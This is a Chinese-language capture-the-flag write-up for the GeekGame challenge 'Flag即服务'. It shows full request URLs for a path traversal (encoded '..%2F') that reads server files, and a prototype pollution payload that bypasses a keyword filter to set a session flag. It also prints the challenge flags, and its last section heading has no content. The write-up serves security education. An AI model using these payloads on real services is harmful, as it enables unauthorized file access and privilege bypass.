# Flag即服务

## 获得代码

调用`https://prob11-przmvj3v.geekgame.pku.edu.cn/api/`报错

```txt
Error: EISDIR: illegal operation on a directory, read
    at Object.readSync (fs.js:617:3)
    at tryReadSync (fs.js:382:20)
    at Object.readFileSync (fs.js:419:19)
    at /usr/src/app/node_modules/jsonaas-backend/index.js:56:19
    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
    at /usr/src/app/node_modules/express/lib/router/index.js:281:22
    at param (/usr/src/app/node_modules/express/lib/router/index.js:354:14)
```

猜测这一API是将我们输入的地址和`data`进行拼接后用`fs.readFileSync`进行读取。

同时，从这一错误信息中可以看到`jsonaas-backend`这个库，猜测这个库中有我们需要的信息。

因为它的路径在`data`的上一层，我们尝试调用`https://prob11-przmvj3v.geekgame.pku.edu.cn/api/..%2Fnode_modules%2Fjsonaas-backend%2Findex.js`来获取这个库的代码（注意这里要把`/`转义为`%2F`）。但提示`File too big!`，说明文件存在但大小超过了API的限制。根据Node项目的特点，猜测同一目录下有`package.json`文件，尝试调用`https://prob11-przmvj3v.geekgame.pku.edu.cn/api/..%2Fnode_modules%2Fjsonaas-backend%2Fpackage.json`，得到：

```json
{
  "_from": "https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz",
  "_id": "jsonaas-backend@1.0.1",
  "_inBundle": false,
  "_integrity": "sha512-1QXyB4EMI5AyDxZKBKd67uKv6ih4WmLElayHqh/PVo/L1JzSN1zWdPJkzch92OGAE2uNd8udoHLYXNrIXKIf9A==",
  "_location": "/jsonaas-backend",
  "_phantomChildren": {},
  "_requested": {
    "type": "remote",
    "raw": "jsonaas-backend@https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz",
    "name": "jsonaas-backend",
    "escapedName": "jsonaas-backend",
    "rawSpec": "https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz",
    "saveSpec": "https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz",
    "fetchSpec": "https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz"
  },
  "_requiredBy": [
    "/"
  ],
  "_resolved": "https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz",
  "_shasum": "9af4bb380e83a63b7e04e0edf8482bb00b2f9f35",
  "_spec": "jsonaas-backend@https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz",
  "_where": "/usr/src/app",
  "author": {
    "name": "You"
  },
  "bundleDependencies": false,
  "dependencies": {
    "express": "^4.17.1",
    "express-session": "^1.17.2",
    "helmet": "^4.6.0"
  },
  "deprecated": false,
  "description": "",
  "license": "WTFPL",
  "main": "index.js",
  "name": "jsonaas-backend",
  "scripts": {},
  "version": "1.0.1"
}
```

从中得到代码的下载链接。下载代码后，从`index.js`的最后看到

```js
if(FLAG0!==`flag{${0.1+0.2}}`)
  return;
```

从而得到第一个Flag为`flag{0.30000000000000004}`。

## 开通会员

注意到源码中`GET /activate`中的判断，只要`req.session.activated`有值，就会输出Flag。

考虑原型链污染。`waf()`函数中的判断是`indexOf`的方式，如果`in_path`是一个字符串，则无法在中间插入我们所需的关键词。而如果构造成对象，则会缺失`indexOf()`方法。查阅`qs`文档，我们可以将`in_path`构造成数组，这样就既保留了`indexOf()`方法，又可以通过加前后缀的方法来避开`waf()`中的判断。

因为后面的处理中屏蔽了`_`，我们希望构造`a.constructor.prototype.activated`这样的链条。注意到程序中用`/`切分了`in_path`，我们构造如下的请求：

`https://prob11.geekgame.pku.edu.cn/api/..%2Fpackage.json?in_path%5b0%5d=%2Fconstructor%2Fprototype%2Factivated%2F`

这样输入的`in_path`为`['/constructor/prototype/activated/']`，而在后面的处理中，得到的`in_path`数组为`['constructor', 'prototype', 'activated']`，完美实现了我们希望达成的污染。

污染之后，调用`GET /activate`即得到第二个Flag`flag{I-Can-ACtivAte-From-Prototype}`。

## 为所欲为
